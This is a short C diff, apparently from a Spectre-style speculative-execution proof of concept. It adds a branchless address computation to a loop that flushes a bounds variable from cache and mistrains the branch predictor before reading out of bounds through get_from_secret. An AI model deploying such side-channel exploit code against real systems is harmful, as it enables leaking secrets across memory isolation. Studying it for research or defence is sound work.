@@ -48,7 +48,16 @@ uint32_t check_single_timing(int idx, int byte){
     for(int i=0; i<TRAIN;i++){
         _mm_flush((void*)&secret_s);
         delay();
+
+
+        //to avoid branch predictor
         int idx_ = i % secret_s;
+        int addr = ((i % FREQ)-1) & ~0xffff;
+        addr = (addr | (addr >> 16));
+        addr = idx_ ^ (addr & (idx_ ^ idx));
+
+        get_from_secret(addr);
+
     }
 
     
